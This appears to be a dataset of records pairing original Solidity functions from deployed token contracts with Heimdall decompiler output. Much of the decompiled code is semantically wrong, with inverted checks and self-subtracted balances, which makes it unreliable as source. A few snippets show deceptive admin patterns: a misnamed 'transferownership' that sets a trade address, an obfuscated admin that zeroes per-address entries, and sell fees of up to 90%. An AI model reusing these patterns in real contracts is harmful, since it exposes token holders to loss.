{"contract_address": "0xeE4121EC610aD03ad4b4b4151ccFB6999022Df86", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\r\\n        _transferOwnership(address(0));\\r\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _owner = 0 | (uint96(_owner));\n        emit OwnershipTransferred(address(_owner / 0x01), 0);\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_u) {\n            if (store_u - ((store_u >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_u >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_u >> 0x01;\n                if (store_u) {\n                    if (store_u - ((store_u >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_u >> 0x01) {\n                            if (0x1f < (store_u >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_c[var_a];\n                                if ((0x20 + var_c) + (store_u >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2c9aF7D51e9D5450da4b4e049792811b86FBFD28", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xd6fDDDc9A79AA8215aEA6CA790D87406dba5CDf3", "original_solidity_code": "function setFeeToSetter(address _feeToSetter) external {\\n        require(msg.sender == feeToSetter, 'UniswapV2: FORBIDDEN');\\n        feeToSetter = _feeToSetter;\\n    }", "heimdall_decompiled_code": "function setFeeToSetter(address arg0) public payable {\n        require(msg.value);\n        require((0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc + msg.data.length) < 0x20);\n        require(arg0 - (address(arg0)));\n        require(!(msg.sender == (address(feeToSetter))), \"UniswapV2: FORBIDDEN\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x14;\n        var_d = 0x556e697377617056323a20464f5242494444454e000000000000000000000000;\n        feeToSetter = (address(arg0)) | (uint96(feeToSetter));\n    }"}
{"contract_address": "0xe7fEA96bA7a112602bCfe9a472473627D88c3De5", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xbC9683EE9525c4525e7e0dCFfe8eeD1447fd4287", "original_solidity_code": "function sendTokens(address distroWallet) external onlyOwner {\r\n        uint256 supply = balanceOf(msg.sender);\r\n        require(supply == INITIAL_SUPPLY, \"Tokens already distributed\");\r\n\r\n        _transfer(msg.sender, distroWallet, supply);\r\n    }", "heimdall_decompiled_code": "function sendTokens(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_f = address(msg.sender);\n        uint256 var_g = 0;\n        require(storage_map_h[var_f] == 0x7c13bc4b2c133c56000000);\n        require(!(address(msg.sender)) == 0);\n        require(!(address(arg0)) == 0);\n        var_a = 0xf5f9a37100000000000000000000000000000000000000000000000000000000;\n        var_b = address(msg.sender);\n        require(address(store_c / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_c / 0x01).Unresolved_f5f9a371(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!(((var_c + ret0.length) - var_c) < 0x20), \"ERC20: transfer ammoudnt exceeds balance\");\n        require(var_h == (var_h), \"ERC20: transfer ammoudnt exceeds balance\");\n        require(!(var_h), \"ERC20: transfer ammoudnt exceeds balance\");\n        var_f = address(msg.sender);\n        var_g = 0;\n        require(!(storage_map_h[var_f] < storage_map_h[var_f]), \"ERC20: transfer ammoudnt exceeds balance\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_e = 0x28;\n        var_j = 0x45524332303a207472616e7366657220616d6d6f75646e742065786365656473;\n        var_k = 0x2062616c616e6365000000000000000000000000000000000000000000000000;\n        var_f = address(msg.sender);\n        var_g = 0;\n        storage_map_h[var_f] = storage_map_h[var_f] - storage_map_h[var_f];\n        var_f = address(arg0);\n        var_g = 0;\n        storage_map_h[var_f] = storage_map_h[var_f] + storage_map_h[var_f];\n        address var_i = storage_map_h[var_f];\n        emit Transfer(address(msg.sender), address(arg0), storage_map_h[var_f]);\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_e = 0x13;\n        var_j = 0x55736572206973206e6f7420616c6c6f77656400000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x23;\n        var_e = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x25;\n        var_e = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x1a;\n        var_e = 0x546f6b656e7320616c7265616479206469737472696275746564000000000000;\n    }"}
{"contract_address": "0x1c6e35bFEA40f3709DA709f0f2e55604C1F53a1f", "original_solidity_code": "function getBR(address t) public view returns (uint256) {\r\n        (uint112 r0, uint112 r1, ) = _pair.getReserves();\r\n        return (_pair.token0() == t) ? uint256(r0) : uint256(r1);\r\n    }", "heimdall_decompiled_code": "function getBR(address arg0) public payable returns (uint112) {\n        var_a = 0x0902f1ac00000000000000000000000000000000000000000000000000000000;\n        require(address(store_b / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_b / 0x01).getReserves(var_b); // staticcall\n        require(!ret0.length < 0x60);\n        var_a = 0x0dfe168100000000000000000000000000000000000000000000000000000000;\n        require(address(store_b).code.length);\n        (bool success, bytes memory ret0) = address(store_b).token0(var_b); // staticcall\n        require(!ret0.length < 0x20);\n        require(address(var_c.length) == (address(arg0)));\n        uint112 var_a = uint112(var_d);\n        return uint112(var_d);\n        var_a = uint112(var_c.length);\n        return uint112(var_c.length);\n    }"}
{"contract_address": "0x6C582560fE845680fA8fFC628a9Ae666008111f4", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x1c6e35bFEA40f3709DA709f0f2e55604C1F53a1f", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual returns (bool) {\r\n        _transfer(msg.sender, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(!(storage_map_a[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x26;\n        var_g = this.code[5182:5220];\n        require(!(arg1 > storage_map_a[var_a]), \"SafeMath: subtraction overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_f = 0x1e;\n        var_h = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        var_a = address(msg.sender);\n        var_b = 0x04;\n        storage_map_a[var_a] = storage_map_a[var_a] - arg1;\n        var_a = address(arg0);\n        require(!((arg1 + storage_map_a[var_a]) < storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_f = 0x1b;\n        var_h = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(arg0);\n        var_b = 0x04;\n        storage_map_a[var_a] = arg1 + storage_map_a[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = this.code[5113:5148];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = this.code[5220:5257];\n    }"}
{"contract_address": "0x7ccFBc00423e429844f344aA62D726E3C0DCbfCA", "original_solidity_code": "function passelonexit(address jhhhqq) public    {\r\n        \r\n        require(_msgSender() == vipadmin123);   \r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 zrqqamount = 0;\r\n        xelonlist[jhhhqq] = zrqqamount; \r\n        \r\n    }", "heimdall_decompiled_code": "function passelonexit(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0;\n    }"}
{"contract_address": "0x718128a4433a5053A43810C1cc51427C89046b7E", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xCe503399D448bC9Ced89D58cf2733BD506f6F27C", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function updateLiquidityWallet(address _liquidityWallet)\r\n        external\r\n        onlyOwner\r\n    {\r\n        require(_liquidityWallet != address(0), \"ERC20: Address 0\");\r\n        address oldWallet = liquidityWallet;\r\n        liquidityWallet = _liquidityWallet;\r\n        emit liquidityWalletUpdated(liquidityWallet, oldWallet);\r\n    }", "heimdall_decompiled_code": "function updateLiquidityWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"ERC20: Address 0\");\n        liquidityWallet = (address(arg0)) | (uint96(liquidityWallet));\n        emit liquidityWalletUpdated(address(arg0), address(liquidityWallet));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x10;\n        var_d = 0x45524332303a2041646472657373203000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc5D1812CD71D19aF93066787a29E3521C47cAd19", "original_solidity_code": "function transferownership(address addr) public returns(bool) {\r\n \r\n        require(msg.sender == owner);\r\n \r\n        tradeAddress = addr;\r\n \r\n        return true;\r\n \r\n    }", "heimdall_decompiled_code": "function transferownership(address arg0) public returns (bool) {\n        require(address(msg.sender) == (address(store_d / 0x01)));\n        store_e = (address(arg0) * 0x01) | (uint96(store_e));\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xeA1F21c4f9BDA00BEDB5871E6C0de6746E1e2929", "original_solidity_code": "function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transferFrom(address arg0, address arg1, uint256 arg2) public {\n        require(!(address(arg0) == 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(address(arg1) == 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(bytes1(owner / 0x01)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x26;\n        var_c = this.code[5427:5465];\n        address var_d = address(arg0);\n        var_e = 0x01;\n        require(!(arg2 > storage_map_c[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        uint256 var_h = var_a.length;\n        require(!(bytes1(var_a.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_j);\n        var_d = address(arg0);\n        var_e = 0x01;\n        storage_map_c[var_d] = storage_map_c[var_d] - arg2;\n        var_d = address(arg1);\n        var_e = 0x01;\n        require(!((storage_map_c[var_d] + arg2) < storage_map_c[var_d]), \"SafeMath: addition overflow\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_h = 0x1b;\n        var_k = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_m = 0x1a;\n        var_n = 0x436f6e74726163742063757272656e746c79207061757365642e000000000000;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_m = 0x24;\n        var_o = this.code[5505:5541];\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_m = 0x26;\n        var_o = this.code[5355:5393];\n    }"}
{"contract_address": "0xc0aC4689fe801A49Be4Ab080c0018eE0d9C3229e", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xf4B4346B0E2220371B87bD140b89E4a4E57c10B7", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x85188f89Ef6A5714818DefC0607727c9BE9f8949", "original_solidity_code": "function manualswap() external {\r\n        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        swapTokensForEth(contractBalance);\r\n    }", "heimdall_decompiled_code": "function manualswap() public view {\n        require(address(msg.sender) == (address(store_l / 0x01)));\n        require(address(msg.sender) == (address(store_m / 0x01)));\n        address var_a = address(this);\n        var_b = 0x02;\n        require(!(storage_map_h[var_a] > store_i), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x2a;\n        var_g = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_h = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x038d7ea4c68000 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x038d7ea4c68000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            if (!store_i < (store_i / 0x038d7ea4c68000)) {\n            }\n        }\n    }"}
{"contract_address": "0x0D5bB4EE4e770C761F2F203c0828Eb2487A0Ab60", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].add(addedValue)\r\n        );\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > ~(arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function updateSellFees(\r\n        uint256 _marketingFee,\r\n        uint256 _liquidityFee\r\n    ) external onlyOwner {\r\n        sellMarketingFee = _marketingFee;\r\n        sellLiquidityFee = _liquidityFee;\r\n        sellTotalFees = sellMarketingFee + sellLiquidityFee;\r\n        previousFee = sellTotalFees;\r\n        require(sellTotalFees <= 90, \"Must keep fees at 90% or less\");\r\n    }", "heimdall_decompiled_code": "function updateSellFees(uint256 arg0, uint256 arg1) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_j = arg0;\n        store_k = arg1;\n        require(!(arg0 > (arg1 + arg0)), \"Must keep fees at 90% or less\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        sellTotalFees = store_k + arg0;\n        store_m = store_k + arg0;\n        require(!(0x5a < (arg1 + arg0)), \"Must keep fees at 90% or less\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1d;\n        var_d = 0x4d757374206b656570206665657320617420393025206f72206c657373000000;\n    }"}
{"contract_address": "0x410cA8f9159f88a864DeEc21f30D5D62E8B75619", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x7435b0C4566F7eDe8d922841290a9cc552e1b96b", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\\n        return true;\\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
